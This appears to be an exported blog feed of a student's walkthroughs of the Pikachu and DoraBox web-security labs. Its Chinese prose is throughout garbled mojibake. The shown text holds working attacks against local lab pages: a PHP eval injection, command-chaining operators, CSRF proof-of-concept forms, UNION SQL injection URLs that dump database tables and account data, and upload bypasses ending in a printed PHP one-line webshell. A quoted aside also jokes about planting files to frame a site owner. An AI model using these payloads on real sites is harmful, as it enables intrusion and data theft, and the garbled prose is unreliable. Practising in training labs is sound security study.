href="#execeval">#</a> exec&quot;eval&quot;</h2><h3 id="è¿‡ç¨‹-16"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-16">#</a> è¿‡ç¨‹</h3><p>éšä¾¿è¾“ä¸€ä¸²å­—ç¬¦ä¸² phpinfo ()ï¼ŒæŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parse error: syntax error, unexpected end of file in D:\phpstudy_pro\WWW\pikachu\vul\rce\rce_eval.php(19) : eval()&#x27;d code on line 1</span><br></pre></td></tr></table></figure><p>åæ¥ç™¾åº¦å‘ç°ï¼š</p><blockquote><p>php çš„ eval å‡½æ•°æ˜¯ç”¨æ¥æŠŠä¸€æ®µæ–‡å­—å½“ä½œä¸€æ®µ php çš„è„šæœ¬æ¥æ‰§è¡Œï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯æˆ‘ä»¬å¯ä»¥åŠ¨æ€ä¿®æ”¹ php æ‰§è¡Œçš„å†…å®¹ã€‚</p><p>ä»Šå¤©æƒ³å®ç°çš„åŠŸèƒ½æ˜¯ï¼šæ ¹æ®ä»æµè§ˆå™¨ get åˆ°çš„æ•°æ®ï¼Œä½¿ç”¨ eval () æ‰§è¡Œä¸åŒçš„å‡½æ•°ï¼š<br>if(isset(_GET['step'])){eval(_GET[â€˜stepâ€™]);<br>}else{<br>content='\<a href="?step=getipall">ç¬¬ä¸€æ­¥ï¼šè·å–æ‰€æœ‰çš„ipåœ°å€\</a>';msg(content);<br>}</p></blockquote><p>æ³¨æ„ï¼Œè¿™ä¸ªä»£ç æ˜¯æœ‰å®‰å…¨é—®é¢˜çš„ï¼Œåƒä¸‡ä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ã€‚</p><p>è¿è¡Œä»¥ä¸Šä»£ç ï¼Œæç¤º â€œeval ()â€™d code on line 1â€ï¼Œæ ¹æ®æç¤ºæ¥çœ‹æ˜¯ eval å‡½æ•°åœ¨æ‰§è¡Œçš„æ—¶å€™å‡ºé”™äº†ã€‚</p><p>ç¬¬ä¸€ååº”å°±æ˜¯ googleï¼Œç»“æœå¾—åˆ°çš„éƒ½æ˜¯å…¶ä»–æˆå“ç¨‹åºå‡ºç°äº†è¿™ä¸ªé”™è¯¯ã€‚è¿™æ—¶å€™è¿˜å¾—å»ç¿» php æ‰‹å†Œï¼Œæ ¹æ®æ‰‹å†Œçš„æè¿°ï¼ševal æ‰€æ‰§è¡Œçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¾—å¿…é¡»æ»¡è¶³ php çš„è¯­æ³•è¦æ±‚ï¼Œå¾ˆæ˜æ˜¾æˆ‘çš„å­—ç¬¦ä¸²é‡Œé¢ç¼ºå°‘äº†æ‹¬å·å’Œæœ€åçš„åˆ†å·ã€‚</p><p>æ‰€ä»¥æ»¡è¶³è¯­æ³•è§„åˆ™ï¼Œpayload æ›´æ”¹ä¸º phpinfo (); å³å¯</p><p>è¿™çœŸçš„æ˜¯ç™½ç»™</p><hr><h2 id="æ€»ç»“-4"><a class="markdownIt-Anchor" href="#æ€»ç»“-4">#</a> æ€»ç»“</h2><p>(1)  ;</p><p>åˆ†å·ï¼Œæ²¡æœ‰ä»»ä½•é€»è¾‘å…³ç³»çš„è¿æ¥ç¬¦ã€‚å½“å¤šä¸ªå‘½ä»¤ç”¨åˆ†å·è¿æ¥æ—¶ï¼Œå„å‘½ä»¤ä¹‹é—´çš„æ‰§è¡ŒæˆåŠŸä¸å¦å½¼æ­¤æ²¡æœ‰ä»»ä½•å½±å“ï¼Œéƒ½ä¼šä¸€æ¡ä¸€æ¡æ‰§è¡Œä¸‹å»ã€‚</p><p>(2) ||</p><p>é€»è¾‘æˆ–ï¼Œå½“ç”¨æ­¤è¿æ¥ç¬¦è¿æ¥å¤šä¸ªå‘½ä»¤æ—¶ï¼Œå‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œåˆ™åé¢çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œã€‚å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œåé¢çš„å‘½ä»¤æ‰ä¼šæ‰§è¡Œã€‚</p><p>(3) &amp;&amp;</p><p>é€»è¾‘ä¸ï¼Œå½“ç”¨æ­¤è¿æ¥ç¬¦è¿æ¥å¤šä¸ªå‘½ä»¤æ—¶ï¼Œå‰é¢çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œæ‰ä¼šæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œå‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œåé¢çš„å‘½ä»¤ä¸ä¼šæ‰§è¡Œï¼Œä¸ || æ­£å¥½ç›¸åã€‚</p><p>(4) |</p><p>ç®¡é“ç¬¦ï¼Œå½“ç”¨æ­¤è¿æ¥ç¬¦è¿æ¥å¤šä¸ªå‘½ä»¤æ—¶ï¼Œå‰é¢å‘½ä»¤æ‰§è¡Œçš„æ­£ç¡®è¾“å‡ºï¼Œä¼šäº¤ç»™åé¢çš„å‘½ä»¤ç»§ç»­å¤„ç†ã€‚è‹¥å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œè‹¥åé¢çš„å‘½ä»¤æ— æ³•å¤„ç†å‰é¢å‘½ä»¤çš„è¾“å‡ºï¼Œä¹Ÿä¼šæŠ¥é”™ã€‚</p><p>ä¾‹ ls | grep *.txt</p><hr><h1 id="csrf"><a class="markdownIt-Anchor" href="#csrf">#</a> CSRF</h1><h2 id="csrfget"><a class="markdownIt-Anchor" href="#csrfget">#</a> csrf(get)</h2><h3 id="è¿‡ç¨‹-17"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-17">#</a> è¿‡ç¨‹</h3><p>poc åœ¨ bp ä¸ŠæŠ“ request åŒ…ï¼Œè‡ªåŠ¨ç”Ÿæˆï¼š</p><p><img src="pikachu-csrf-001.png" alt=""></p><p>pocï¼Œåœ¨é‡Œé¢ä¿®æ”¹ä½ è¦æ”¹çš„å€¼:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hehe&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hehe&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;12345678<span class="symbol">&amp;#64;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç»™ç”¨æˆ·ç‚¹å‡»æŒ‰é’®åè·³è½¬ï¼š</p><p><img src="pikachu-csrf-002.png" alt=""></p><p>ä¿®æ”¹æˆåŠŸ</p><h2 id="csrfpost"><a class="markdownIt-Anchor" href="#csrfpost">#</a> csrfï¼ˆpostï¼‰</h2><h3 id="è¿‡ç¨‹-18"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-18">#</a> è¿‡ç¨‹</h3><p>å’Œ get ç›¸æ¯”ï¼Œå°±æ˜¯ action åé¢åŠ äº†ä¸ª method=â€œPOSTâ€ï¼Œç„¶åå°±æ˜¯ä¸€æ ·çš„æ“ä½œäº†</p><p>pocï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="csrftokenæ²¡ç»•è¿‡å»å¯ä»¥ç”¨bpç»•æŠŠ"><a class="markdownIt-Anchor" href="#csrftokenæ²¡ç»•è¿‡å»å¯ä»¥ç”¨bpç»•æŠŠ">#</a> csrf (token)ï¼ˆæ²¡ç»•è¿‡å»ï¼Ÿå¯ä»¥ç”¨ bp ç»•æŠŠï¼‰</h2><h3 id="è¿‡ç¨‹-19"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-19">#</a> è¿‡ç¨‹</h3><p>æ²¡ç»•è¿‡å»ï¼Œä¸‹é¢æœ‰ä¸ªæœåŠ¡å™¨ç»™çš„éšè—çš„ token</p><p>ï¼ˆè¿™é‡Œå¯ä»¥åˆ©ç”¨ bp è‡ªå¸¦çš„åŠŸèƒ½ï¼Œå°†è¿”å›æ•°æ®åŒ…ä¸­çš„ token æ•°æ®è®¾ç½®ä¸ºä¸‹ä¸€è¯·æ±‚æ•°æ®åŒ…çš„å‚æ•°ï¼‰</p><h3 id="æ€»ç»“-5"><a class="markdownIt-Anchor" href="#æ€»ç»“-5">#</a> æ€»ç»“ï¼š</h3><p>æ€»ç»“ä¹‹ä¸çŸ¥é“è‡ªå·±å½“æ—¶åœ¨æƒ³ä»€ä¹ˆå¯¼è‡´åªèƒ½æµ‘æ°´æ‘¸é±¼ç³»åˆ—â—” â€¸â—”</p><hr><h2 id="æœ€åæƒ³è¯´çš„è¯"><a class="markdownIt-Anchor" href="#æœ€åæƒ³è¯´çš„è¯">#</a> æœ€åæƒ³è¯´çš„è¯</h2><p>åªè¦èŠ±æ—¶é—´å»åŠªåŠ›ï¼ŒçœŸçš„ä¼šå˜å¼ºçš„ï¼ï¼ï¼</p><p>çœ‹è§è‡ªå·±ä»¥å‰å†™çš„æ–‡ç« ï¼Œè«åè½æ³ª</p><p>ã€‚</p><p>çªç„¶æƒ³æ¥ä¸€ä¸ªä¸æ˜è§‰å‰ãƒ½ (âœ¿ï¾Ÿâ–½ï¾Ÿ) ãƒ</p><p>çªç„¶ä¼¤æ„Ÿæ°›å›´æ‰“ç ´</p>]]></content>
      
      
      <categories>
          
          <category> å¤§å†’é™© </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu,webé¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>doraboxå†’é™©æ‰‹è®°</title>
      <link href="/2020/10/15/dmx/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/"/>
      <url>/2020/10/15/dmx/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="sqliå­—ç¬¦å‹"><a class="markdownIt-Anchor" href="#sqliå­—ç¬¦å‹">#</a> SQLi å­—ç¬¦å‹</h1><h2 id="è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹">#</a> è¿‡ç¨‹ï¼š</h2><p>å­—ç¬¦å‹å’Œæ•°å­—å‹ç›¸æ¯”ï¼Œå°±æ˜¯è¦é—­åˆå•å¼•å·å§</p><ol><li><p>å•å¼•å·é—­åˆï¼Œ# ç”¨ url ç¼–ç  %23ï¼š</p><p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 %23' &amp;submit=submit</code> <img src="dorabox_sqlchar002.png" alt=""></p><p>ä¸‹é¢å°±æ˜¯å’Œæ•°å­—å‹æ³¨å…¥ç›¸åŒçš„æ“ä½œã€‚</p></li><li><p>åˆ©ç”¨ order by æˆ–è€… group by åˆ¤æ–­å­—æ®µæ•°ï¼š</p><p>æ­£å¸¸ï¼š <code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 order by 3 %23' &amp;submit=submit</code></p><p>æŠ¥é”™ï¼š <code>http://localhost/dorabox/sql_injection/sql_string.php</code> <br>?title=1â€™ or 1=1 order by 4 %23â€™<br>&amp;submit=submit</p><p>ä»¥ä¸Šè¯´æ˜éœ€è¦ 3 ä¸ªå­—æ®µ</p></li><li><p>çˆ†è¯¥æ•°æ®åº“æ‰€æœ‰è¡¨å’Œ news è¡¨æœ‰å¤šå°‘æ¡æ•°æ®</p><p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union select  1,(select table_rows from information_schema.tables where table_name='news' and table_schema = database()),(select group_concat(table_name) from information_schema.tables where table_schema = database())  %23' &amp;submit=submit</code></p><p>å› ä¸ºæ²¡æœ‰ title ä¸ºâ€™1â€™çš„æ–‡ç« ï¼Œæ‰€ä»¥ç›´æ¥åªä¼šå‡ºåé¢æ”»å‡»æ‰€å¾—æ•°æ®<img src="dorabox_sqlchar003.png" alt=""></p><p>æ³¨å…¥çš„ä¸‰ä¸ªå­—æ®µï¼š</p><ul><li><p>1 å¹¶ä¸ä¼šè¾“å‡ºï¼Œæ‰€ä»¥éšæ„</p></li><li><p>(select table_rows from information_schema.tables where table_name=â€˜newsâ€™ and table_schema = database ()) ï¼Œç”¨äºç»Ÿè®¡è¯¥è¡¨çš„æ•°æ®æ•°é‡ï¼Œæ²¡ä»€ä¹ˆç”¨ï¼Œå°±æ˜¯æƒ³è¯•è¯•çœ‹</p></li><li><p>(select group_concat (table_name) from information_schema.tables where table_schema = database ())ï¼Œåˆ©ç”¨ group_concat () æ‹¼æ¥å­—ç¬¦ä¸²çˆ†è¡¨å</p></li></ul></li><li><p>çˆ†å­—æ®µ</p><p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,group_concat(column_name) from information_schema.columns where table_name = 'account' and table_schema = database() %23' &amp;submit=submit</code></p><p><img src="dorabox_sqlchar004.png" alt=""></p></li><li><p>çˆ†å†…å®¹</p><p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,concat_ws('-',id,rest,own) from account %23' &amp;submit=submit</code></p><p><img src="dorabox_sqlchar005.png" alt=""></p></li></ol><h2 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“">#</a> æ€»ç»“ï¼š</h2><p>åœ¨ sql æ³¨å…¥ä¸­ï¼Œæ³¨é‡Šå¸¸ç”¨â€™â€“+â€™ï¼Œè€Œæ³¨é‡Šç¬¦â€™#â€˜å’Œâ€™â€“' ä¸€èˆ¬ä¸èƒ½ç›´æ¥ä½¿ç”¨ã€‚</p><ul><li>â€˜#â€™ï¼šsql æ‰‹å·¥æ³¨å…¥æ—¶ï¼Œæµè§ˆå™¨åœ°å€æ è¾“å…¥çš„ 'ï¼ƒ' å¹¶æ²¡æœ‰å‘é€åˆ°åå°ï¼Œå› ä¸º url ä¸­ #å·æ˜¯ç”¨æ¥æŒ‡å¯¼æµè§ˆå™¨åŠ¨ä½œçš„ï¼ˆä¾‹å¦‚é”šç‚¹ï¼‰ï¼Œå¯¹æœåŠ¡å™¨ç«¯å®Œå…¨æ— ç”¨ï¼Œ# çš„ url ç¼–ç æ˜¯ %23ï¼Œæ›¿æ¢åå¯è¡Œ</li><li>â€˜â€“â€™ï¼šåœ¨å­—ç¬¦å‹æ³¨å…¥æ—¶ï¼Œâ€“å’Œå•å¼•å·è¿æ¥åœ¨ä¸€èµ·æ—¶ï¼Œæ— æ³•å½¢æˆæœ‰æ•ˆçš„ mysql è¯­å¥ï¼Œå¯èƒ½é€ æˆå•å¼•å·æœªé—­åˆé”™è¯¯ã€‚æ‰€ä»¥å¯ä»¥ä½¿ç”¨â€“â€™ï¼Œä¹Ÿå¯ä»¥å°è¯•ç”¨å¤šè¡Œæ³¨é‡Šç¬¦ï¼ˆå—æ³¨é‡Šç¬¦ /**/ï¼‰ã€ä¸€å¯¹è‹±æ–‡æ‹¬å·ã€æ¢è¡Œç¬¦æˆ–åŠ å·æ¥ä»£æ›¿ç©ºæ ¼</li></ul><h1 id="sqliæœç´¢å‹"><a class="markdownIt-Anchor" href="#sqliæœç´¢å‹">#</a> SQLi æœç´¢å‹</h1><p>ç±»ä¼¼å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸»è¦å°±æ˜¯é—­åˆ</p><p><img src="dorabox_sqlss001.png" alt=""></p><h2 id="è¿‡ç¨‹-2"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-2">#</a> è¿‡ç¨‹ï¼š</h2><ol><li><p>è¿›è¡Œé—­åˆ</p><p>â€˜<a href="http://localhost/dorabox/sql_injection/sql_search.php">http://localhost/dorabox/sql_injection/sql_search.php</a><br>?content=â€™ or â€˜%â€™=â€™<br>&amp;submit=submitâ€™</p><p><img src="dorabox_sqlss002.png" alt=""></p></li><li><p>åˆ¤æ–­éœ€è¦çš„å­—æ®µæ•° 3 ä¸ªï¼ˆæ„Ÿè§‰è¿™ç§æ–¹æ³•æœ‰ç‚¹ä½çº§ï¼‰</p><p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=' union select 1,2,3 and '%'='  &amp;submit=submit</code></p><p><img src="dorabox_sqlss003.png" alt=""></p></li><li><p>çˆ†è¡¨ï¼Œå¸¸è§„æ‰‹æ®µ</p><p><code>SELECT * FROM news WHERE content like '%$$$$$$' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and '%'=' %'</code></p><p><img src="dorabox_sqlss004.png" alt=""></p></li><li><p>çˆ†å­—æ®µ</p><p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'account' and '%'=' &amp;submit=submit</code></p><p><img src="dorabox_sqlss005.png" alt=""></p></li><li><p>çˆ†å†…å®¹</p><p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, concat_ws('--',id,rest,own) from account where '%'=' &amp;submit=submit</code></p><p><img src="dorabox_sqlss006.png" alt=""></p></li></ol><h2 id="æ€»ç»“-2"><a class="markdownIt-Anchor" href="#æ€»ç»“-2">#</a> æ€»ç»“ï¼š</h2><p>sql é€šé…ç¬¦</p><table><thead><tr><th style="text-align:left">é€šé…ç¬¦</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">%</td><td style="text-align:left">æ›¿ä»£ 0 ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</td></tr><tr><td style="text-align:left">_</td><td style="text-align:left">æ›¿ä»£ä¸€ä¸ªå­—ç¬¦</td></tr><tr><td style="text-align:left">[<em>charlist</em>]</td><td style="text-align:left">å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦</td></tr><tr><td style="text-align:left">[^<em>charlist</em>] æˆ– [!<em>charlist</em>]</td><td style="text-align:left">ä¸åœ¨å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦</td></tr></tbody></table><h1 id="jsé™åˆ¶æ–‡ä»¶ä¸Šä¼ "><a class="markdownIt-Anchor" href="#jsé™åˆ¶æ–‡ä»¶ä¸Šä¼ ">#</a> JS é™åˆ¶æ–‡ä»¶ä¸Šä¼ </h1><p>å‰ç«¯è¿›è¡Œäº†æ–‡ä»¶ååç¼€è¿‡æ»¤</p><p><img src="dorabox_fp_js003.png" alt=""></p><h2 id="è¿‡ç¨‹-3"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-3">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>æ‰“å¼€æºä»£ç ï¼ŒæŠŠè“è‰²æ¡†éƒ¨åˆ†å†…å®¹åˆ é™¤ï¼Œå³ç»•è¿‡éªŒè¯å‡½æ•°<img src="dorabox_fp_js002.png" alt=""></li><li>ä¸Šä¼ æˆåŠŸï¼Œè·¯å¾„å‘Šè¯‰äº†ï¼Œèœåˆ€ç›´è¿</li></ol><p><img src="dorabox_fp_js001.png" alt=""></p><h2 id="æ€»ç»“-3"><a class="markdownIt-Anchor" href="#æ€»ç»“-3">#</a> æ€»ç»“ï¼š</h2><p>é‡è§äº†ä¸€ä¸ªé—®é¢˜ï¼Œè¿˜æ²¡æœ‰è§£å†³ï¼š</p><p>ä¸ºä»€ä¹ˆä¿®æ”¹ js ä»£ç ï¼ŒåŠ ä¸Š |.php ä¸ç”Ÿæ•ˆï¼Œè€Œåˆ é™¤å‡½æ•°éªŒè¯ä¸€æ”¹ä¸€ä¸ªå‡†ï¼Ÿ</p><p>æ®è¯´å°±æ˜¯ä¸å¯ä»¥æ”¹ï¼ˆå°èœèœï¼Œè¦åœ¨å‰ç«¯æ§åˆ¶å°è¾“å…¥è¯¥å‡½æ•°ï¼Œæ‰ä¼šç”Ÿæ•ˆï¼‰</p><h1 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a class="markdownIt-Anchor" href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ ">#</a> ä»»æ„æ–‡ä»¶ä¸Šä¼ </h1><p>éšä¾¿ä¼ </p><p><img src="dorabox_fp_all001.png" alt=""></p><h2 id="è¿‡ç¨‹-4"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-4">#</a> è¿‡ç¨‹ï¼š</h2><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œè·å–åˆ°æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼Œç”¨èœåˆ€ç›´æ¥è¿æ¥</p><p><img src="dorabox_fp_all002.png" alt=""></p><p>ä¸Šä¼ çš„ php ä¸€å¥è¯æœ¨é©¬ attack.phpï¼š</p><p><code> &lt;?php @eval($_POST['attack']) ?&gt;</code></p><h2 id="æ€»ç»“-4"><a class="markdownIt-Anchor" href="#æ€»ç»“-4">#</a> æ€»ç»“ï¼š</h2><ol><li><p>php ä¸€å¥è¯æœ¨é©¬åŸºæœ¬åŸç†ï¼š</p><ul><li>@è¡¨ç¤ºåé¢å³ä½¿æ‰§è¡Œé”™è¯¯ï¼Œä¹Ÿä¸æŠ¥é”™ ($_POST [attack] å¦‚æœä¸åŠ  @ä¼šæŠ¥é”™ï¼Œå› ä¸º attack å˜é‡æ²¡æœ‰å®šä¹‰å°±è¢«ä½¿ç”¨äº†ï¼ŒæŠ¥é”™ä¼šæš´éœ²å¯†ç )</li><li>eval () å‡½æ•°ï¼Œæ‹¬å·å†…çš„è¯­å¥å­—ç¬¦ä¸²ä»€ä¹ˆçš„éƒ½å½“åšä»£ç æ‰§è¡Œ</li><li>$_POST [â€˜attackâ€™] è¡¨ç¤ºä»¥ post çš„æ–¹å¼æ¥æ”¶å˜é‡ attackï¼ŒæŠŠå˜é‡ attack é‡Œé¢çš„å­—ç¬¦ä¸²å½“åš php ä»£ç æ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œè‹¥æ¥æ”¶åˆ°å‚æ•° attack=echo â€˜attackâ€™ï¼Œæ­¤æ—¶ä»£ç å˜ä¸º eval (â€œecho â€˜attackâ€™;â€)ï¼Œå°±ä¼šè¾“å‡º attack</li></ul></li><li><p>TruBW åšä¸»ä¸¾çš„å¸¸ç”¨çš„æ–¹æ³•ï¼š</p><blockquote><p>ä½ æƒ³æŸ¥çœ‹ç›®æ ‡ç¡¬ç›˜é‡Œæœ‰æ²¡æœ‰å°é»„ç‰‡ï¼Œå¯ä»¥ç”¨ php å‡½æ•°ï¼š <code>opendir()</code>  å’Œ <code>readdir()</code>  ç­‰ç­‰ã€‚æƒ³ä¸Šä¼ ç‚¹å°é»„ç‰‡ï¼Œè¯¬é™·ç«™ä¸»ï¼Œå°±ç”¨ php å‡½æ•°ï¼š <code>move_uploaded_file</code> ï¼Œå½“ç„¶ç›¸åº”çš„ html è¦å†™å¥½ã€‚ä½ æƒ³æ‰§è¡Œ cmd å‘½ä»¤ï¼Œåˆ™ç”¨ <code>exec()</code> ã€‚</p></blockquote></li></ol><h1 id="mimeé™åˆ¶æ–‡ä»¶ä¸Šä¼ "><a class="markdownIt-Anchor" href="#mimeé™åˆ¶æ–‡ä»¶ä¸Šä¼ ">#</a> MIME é™åˆ¶æ–‡ä»¶ä¸Šä¼ </h1><p>.jpg å¯ä»¥ä¸Šä¼ æˆåŠŸ</p><p><img src="dorabox_fp_mime001.png" alt=""></p><h2 id="è¿‡ç¨‹-5"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-5">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>æ‰“å¼€ç½‘ç»œæŠ“åŒ…ï¼ŒæŠŠåç¼€ä¿®æ”¹ä¸º.php<img src="dorabox_fp_mime002.png" alt=""></li><li>ä¸Šä¼ æˆåŠŸï¼Œèœåˆ€ç›´è¿<img src="dorabox_fp_mime003.png" alt=""></li></ol><h2 id="æ€»ç»“-5"><a class="markdownIt-Anchor" href="#æ€»ç»“-5">#</a> æ€»ç»“ï¼š</h2><p><strong>MIME ä»‹ç»ï¼š</strong></p><blockquote><p>MIMEï¼ˆMultipurpose Internet Mail 